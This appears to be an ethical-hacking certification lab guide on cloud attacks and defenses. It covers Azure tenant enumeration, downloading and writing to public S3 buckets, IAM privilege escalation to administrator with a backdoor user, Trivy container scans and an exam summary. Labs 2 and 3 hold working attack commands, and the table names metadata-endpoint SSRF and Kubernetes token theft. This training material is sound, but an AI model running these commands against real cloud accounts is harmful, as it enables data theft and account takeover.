# Module 19: Cloud Computing - Lab Guide

## Tools Used & Purpose

- **AWS CLI**: Interrogating Amazon Web Services resources, S3 storage buckets, EC2 instances, and IAM credentials.
- **AADInternals**: PowerShell module for administering and exploiting Azure Active Directory (Microsoft Entra ID) and hybrid identities.
- **lazys3 / S3Scanner**: Automated tools for scanning, discovering, and evaluating open or misconfigured AWS S3 buckets.
- **Trivy**: Comprehensive vulnerability and misconfiguration scanner for container images, Dockerfiles, and cloud assets.
- **Docker**: Inspecting container environments, discovering exposed sockets (`/var/run/docker.sock`), and container breakout analysis.
- **ScoutSuite**: Multi-cloud security auditing tool assessing risk posture across AWS, Azure, and GCP.
- **Pacu / Prowler**: AWS exploitation and compliance assessment frameworks evaluating IAM privilege escalation vectors.

---

## 5. Hands-On Practical Labs Walkthrough

### Lab 1: Perform Reconnaissance on Azure

#### Task 1: Azure Reconnaissance with AADInternals

- <b>Environment:</b>
  - System: Windows 11 Virtual Machine (<code>10.10.1.11</code>).
  - Tool: PowerShell 7+, <code>AADInternals</code> module.
  - Objective: Perform non-intrusive enumeration of a target organization's Microsoft Azure / Entra ID tenant.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Install and Import AADInternals Module:</b>
     - Open PowerShell as Administrator on Windows 11.
     - Install the official AADInternals module from PowerShell Gallery:
       ```powershell
       Install-Module -Name AADInternals -Force -Scope CurrentUser
       Import-Module AADInternals
       ```
  2. <b>Enumerate Target Azure AD Tenant Domains:</b>
     - Execute reconnaissance against a target corporate domain (e.g., <code>target.com</code>):
       ```powershell
       Get-AADIntTenantDomains -Domain target.com
       ```
     - <b>Output Analysis:</b> Identifies all verified secondary domains, custom domains, and the canonical Microsoft cloud namespace (<code><company>.onmicrosoft.com</code>).
  3. <b>Discover Azure Tenant ID & Federation Status:</b>
     - Extract the globally unique Tenant GUID:
       ```powershell
       Get-AADIntTenantID -Domain target.com
       ```
     - Check whether the tenant uses Managed Authentication (cloud-only password hash sync) or Federated Authentication (ADFS / PingFederate / Okta):
       ```powershell
       Get-AADIntTenantAuthentication -Domain target.com
       ```
     - If federated, identify the external Security Token Service (STS) URL and SAML signing certificate parameters for potential Golden SAML attacks.

---

### Lab 2: Exploit S3 Buckets

#### Task 1: Enumerate and Exploit Open S3 Buckets using AWS CLI

- <b>Environment:</b>
  - System: Parrot Security (<code>10.10.1.13</code>) / Windows 11.
  - Tools: AWS CLI (<code>aws</code>), <code>lazys3</code>, S3Scanner.
  - Objective: Discover publicly accessible AWS S3 storage buckets, enumerate contents, and exfiltrate confidential files.
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Configure AWS CLI with Test Identity:</b>
     - Open Terminal on Parrot Security:
       ```bash
       aws configure
       ```
     - Provide low-privilege test AWS Access Key ID, Secret Access Key, default region (<code>us-east-1</code>), and output format (<code>json</code>).
  2. <b>Audit Open S3 Bucket for Unauthenticated Public Listing:</b>
     - Execute unauthenticated query against suspected corporate bucket:
       ```bash
       aws s3 ls s3://target-corp-backups/ --no-sign-request
       ```
     - <b>Observed Result:</b> Bucket policy misconfiguration permits <code>AllUsers</code> listing. The terminal displays file directory structures containing database dumps (<code>db_backup_2026.sql</code>), customer spreadsheets (<code>customers.csv</code>), and private keys (<code>vpn_config.ovpn</code>).
  3. <b>Exfiltrate Confidential Data from Public Bucket:</b>
     - Download all files recursively to the attacker's local directory:
       ```bash
       aws s3 sync s3://target-corp-backups/ /home/attacker/exfiltrated_data/ --no-sign-request
       ```
  4. <b>Test for Unauthorized Object Upload (Write Access):</b>
     - Attempt to upload a test file to verify if the bucket permits arbitrary uploads:
       ```bash
       echo "Proof of Concept: Unauthorized Write Access" > proof.txt
       aws s3 cp proof.txt s3://target-corp-backups/proof.txt --no-sign-request
       ```
     - Successful upload confirms critical severity misconfiguration permitting website defacement or malware staging.

---

### Lab 3: Privilege Escalation in AWS IAM

#### Task 1: Escalate IAM User Privileges by Exploiting Misconfigured User Policy

- <b>Environment:</b>
  - System: Parrot Security (<code>10.10.1.13</code>).
  - Target: AWS Cloud IAM Account.
  - Tool: AWS CLI (<code>aws</code>).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Audit Compromised Low-Privilege IAM User Rights:</b>
     - Open Terminal on Parrot Security, gain root via <code>sudo su</code>.
     - Check assigned IAM user policies for current user <code>Test</code>:
       ```bash
       aws iam list-user-policies --user-name Test
       aws iam list-attached-user-policies --user-name Test
       ```
     - Inspect policy statements revealing that the user possesses the dangerous permission: <code>iam:AttachUserPolicy</code> or <code>iam:PutUserPolicy</code>.
  2. <b>Craft Escalated AdministratorAccess Policy Payload:</b>
     - Create a local policy JSON definition:
       ```bash
       vim user-policy.json
       ```
     - Insert policy granting full administrative rights over all cloud resources:
       ```json
       {
           "Version": "2012-10-17",
           "Statement": [
               {
                   "Effect": "Allow",
                   "Action": "*",
                   "Resource": "*"
               }
           ]
       }
       ```
  3. <b>Inject Policy & Escalate Privileges:</b>
     - Attach the managed <code>AdministratorAccess</code> policy to the user:
       ```bash
       aws iam attach-user-policy --user-name Test --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
       ```
     - Alternatively, apply the inline policy payload:
       ```bash
       aws iam put-user-policy --user-name Test --policy-name PrivEscAdmin --policy-document file://user-policy.json
       ```
  4. <b>Verify Full Cloud Compromise:</b>
     - Run administrative commands previously denied:
       ```bash
       aws iam create-user --user-name BackdoorAdmin
       aws ec2 describe-instances
       ```
     - Full administrative takeover of the cloud tenant is achieved.

---

### Lab 4: Perform Vulnerability Assessment on Docker Images

#### Task 1: Vulnerability Assessment on Docker Images using Trivy

- <b>Environment:</b>
  - System: Parrot Security (<code>10.10.1.13</code>).
  - Tool: Docker Engine, <code>Trivy</code> Vulnerability Scanner.
  - Images: <code>ubuntu:latest</code> (secure baseline) vs. <code>nginx:1.19.6</code> (vulnerable legacy).
- <b>Step-by-Step Operational Procedure:</b>
  1. <b>Pull and Scan Baseline Secure Docker Image:</b>
     - Open Terminal on Parrot Security and pull standard Ubuntu image:
       ```bash
       docker pull ubuntu
       ```
     - Execute vulnerability assessment using Trivy:
       ```bash
       trivy image ubuntu
       ```
     - <b>Observed Result:</b> Trivy scans the package manager database (<code>dpkg</code>) against the National Vulnerability Database (NVD). Observe that the latest Ubuntu base image reports <b>0 vulnerabilities</b>.
  2. <b>Pull and Scan Legacy Vulnerable Container Image:</b>
     - Pull legacy Nginx web server image:
       ```bash
       docker pull nginx:1.19.6
       ```
     - Run Trivy security assessment against the vulnerable image:
       ```bash
       trivy image nginx:1.19.6
       ```
     - <b>Observed Result:</b> Trivy detects <b>401 vulnerabilities</b> (categorized into Low, Medium, High, and CRITICAL severity), displaying CVE identifiers, affected library packages (e.g., <code>libssl1.1</code>, <code>libc6</code>), severity scores, and patched versions.
  3. <b>Generate Machine-Readable Compliance Audit Report:</b>
     - Export scan results to JSON for CI/CD pipeline integration:
       ```bash
       trivy image --format json -o nginx_audit.json nginx:1.19.6
       ```

---

## 6. High-Frequency Exam Indicators & Key Memory Anchors

```javascript
+----------------------------------------------------------------------------------------------------+
|                                  CEH v13 EXAM CRITICAL FOCUS POINTS                                |
+----------------------------+-----------------------------------------------------------------------+
| Exam Question Theme        | Key Answer / Official EC-Council Exam Concept                         |
+----------------------------+-----------------------------------------------------------------------+
| NIST Cloud Characteristics | On-demand self-service, broad network access, resource pooling,       |
| (5 Essential Traits)       | rapid elasticity, measured service (NIST SP 800-145).                 |
+----------------------------+-----------------------------------------------------------------------+
| Shared Responsibility      | IaaS: Customer manages OS & up; CSP manages hypervisor & physical.    |
| Service Model Division     | PaaS: Customer manages App & Data; SaaS: Customer manages Access/Data |
+----------------------------+-----------------------------------------------------------------------+
| Cloud Metadata IP          | 169.254.169.254 (non-routable link-local IP); SSRF target to exfiltrate|
| (IMDS Exploitation)        | IAM credentials & temporary STS tokens (IMDSv1 lacks auth header).    |
+----------------------------+-----------------------------------------------------------------------+
| AWS IMDSv2 Protection      | Requires session-oriented token via PUT request with TTL header;      |
|                            | blocks traditional blind SSRF exploitation.                           |
+----------------------------+-----------------------------------------------------------------------+
| S3 Bucket Misconfiguration | AllUsers grants public Internet access; AuthenticatedUsers grants     |
|                            | access to ANY valid AWS account holder globally (not just company).   |
+----------------------------+-----------------------------------------------------------------------+
| IAM Privilege Escalation   | iam:AttachUserPolicy / iam:PutUserPolicy granting AdministratorAccess;|
|                            | iam:CreatePolicyVersion setting malicious policy as default.          |
+----------------------------+-----------------------------------------------------------------------+
| Docker Daemon Port Flaw    | TCP Port 2375 (unencrypted) / 2376 (TLS); unauth remote API allows    |
|                            | launching privileged containers mounting host root filesystem (/host).|
+----------------------------+-----------------------------------------------------------------------+
| Kubernetes (K8s) Ports     | Port 10250 (Kubelet API - RCE), Port 2379 (etcd key-value store),    |
|                            | Port 8443 / 9090 (Kubernetes Dashboard console).                      |
+----------------------------+-----------------------------------------------------------------------+
| Service Account Token Path | /var/run/secrets/kubernetes.io/serviceaccount/token                   |
| (Kubernetes Pod Extraction)| JWT bearer token used by pods to authenticate to K8s API server.      |
+----------------------------+-----------------------------------------------------------------------+
| Cloud Defense Taxonomy     | CASB (enforces policies between client and cloud), CSPM (detects      |
| (CASB, CSPM, CWPP, CIEM)   | cloud misconfigurations & compliance drift), CWPP (protects workloads)|
+----------------------------+-----------------------------------------------------------------------+
| AWS Auditing Services      | CloudTrail (API audit log), CloudWatch (monitoring/metrics),          |
|                            | GuardDuty (intelligent threat detection), Macie (S3 PII discovery).   |
+----------------------------+-----------------------------------------------------------------------+
| Container Auditing Tool    | Trivy (scans container images for OS/library CVEs & misconfigurations)|
+----------------------------+-----------------------------------------------------------------------+
```
